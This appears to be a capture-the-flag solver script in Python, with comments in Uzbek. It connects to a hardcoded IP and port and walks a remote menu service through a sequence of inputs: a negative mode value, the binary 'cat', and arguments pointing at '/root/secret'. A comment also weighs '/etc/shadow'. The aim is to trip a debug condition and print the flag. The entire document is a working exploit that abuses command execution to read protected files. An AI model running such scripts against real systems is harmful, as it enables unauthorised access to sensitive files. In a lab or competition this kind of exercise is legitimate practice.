import socket
import time

def solve():
    host = '154.57.164.68'
    port = 31363

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    
    try:
        s.connect((host, port))
        
        def wait_and_send(payload):
            # Serverdan savol kelishini kutamiz
            chunk = b""
            while b"> " not in chunk:
                try:
                    data = s.recv(1024)
                    if not data: break
                    chunk += data
                except:
                    break
            print(f"Server: {chunk.decode(errors='ignore').strip()}")
            print(f"Sending: {payload}")
            s.sendall(payload.encode() + b'\n')
            time.sleep(0.3)

        # 1. Mode
        wait_and_send("1")
        wait_and_send("-1")

        # 2. Bin
        wait_and_send("2")
        wait_and_send("cat")

        # 3. Arguments
        # Bizga debug[0] != debug[1] kerak. 
        # 'cat .' (rc=1), 'cat /etc/shadow' (rc=1) bo'lib qolishi mumkin.
        # Shuning uchun 'cat' va 'ls'ni aralashtirib ko'ramiz yoki:
        wait_and_send("3")
        # 'cat' ga bitta papka va bitta mavjud bo'lmagan fayl beramiz
        wait_and_send(".,/root/secret") 

        # 4. Switches
        wait_and_send("4")
        wait_and_send(".,.")

        # 5. Execute
        wait_and_send("5")

        # Flagni kutish
        time.sleep(1)
        print("\n[+] Final Output:")
        print(s.recv(4096).decode(errors='ignore'))

    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    solve()
